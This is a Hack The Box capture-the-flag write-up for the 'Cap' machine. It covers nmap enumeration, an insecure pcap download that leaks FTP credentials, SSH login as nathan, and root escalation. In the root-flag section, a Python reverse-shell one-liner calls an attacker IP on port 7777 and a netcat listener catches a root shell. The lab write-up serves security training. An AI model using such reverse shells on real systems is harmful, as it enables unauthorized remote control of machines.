# [HTB] - Cap

[Room link](https://app.hackthebox.com/machines/Cap)

---

<br>

## Enumeration

Simple nmap :

```bash
$ sudo nmap -sS -oN nmap.txt 10.10.10.245
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

<br>

Simple map with script execution and versions

```bash
$ sudo nmap -p21,22,80 -sC -sV -oN nmap-openports-1.txt 10.10.10.245
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 12 Jun 2022 16:04:38 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
```

<br>

Nmap every ports : there is no more open ports.

```bash
$ sudo nmap -sS -p- -oN nmap-full.txt 10.10.10.245
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```

<br>

On the website, we are logged as Nathan. We can go to "home" page then we have a possibilty to get a "security snapshot". If we want to get a new security snapshot, there is no data in our new pcap file. But the url is : http://10.10.10.245/data/1. If we get this url http://10.10.10.245/data/0 we have more informations.
So download this file and open with Wireshark.

If we go on the stream TCP and Flux n°3, we can have the nathan's credentials through a ftp connection.

```bash
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS *************
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

---

<br>

## Exploitation

Let's connect to FTP

```bash
$ ftp 10.10.10.245       
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:*): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
[...]
ftp> ls -la                                                                            
200 PORT command successful. Consider using PASV.                                      
150 Here comes the directory listing.                                                  
drwxr-xr-x    3 1001     1001         4096 May 27  2021 .                              
drwxr-xr-x    3 0        0            4096 May 23  2021 ..                             
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null     
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout                   
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc                        
drwx------    2 1001     1001         4096 May 23  2021 .cache                         
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile                       
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null          
-r--------    1 1001     1001           33 Jun 12 16:01 user.txt
```

<br>

We can also connect us as nathan on the machine through ssh

```bash
$ ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
```

---

<br>

## User flag

So, we have the user's flag. There is in user.txt on the nathan's home directory.

```bash
$ cat ~/user.txt
```

---

<br>

## Root flag

Move on the /var/www/html directory. There is a python script in here. Check it.

```bash
# permissions issues with gunicorn and threads. hacky solution for now.
        os.setuid(0)
        #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
        command = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        print(command)
        os.system(command)
        #os.setuid(1000)
[...]
if __name__ == "__main__":
        app.run("0.0.0.0", 88, debug=True)
```

Uncomment the os.setuid(0) and modify the "command" variable as above. The objectif is to set up a reverse shell. Finally, modify the port for application (on port 88 in this case).

Now, set up the netcat listenner on attack machine

```bash
$ nc -lnvp 7777
```

And then, start the python script modified.

```bash
$ python3 app.py
```

Now, go to the new website on port 88 and run "security snapshots". Reverse shell works. We can get the root flag.

```bash
$ nc -lnvp 7777                                                                 1 ⨯
listening on [any] 7777 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.245] 41786
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cat /root/root.txt
*****************
```
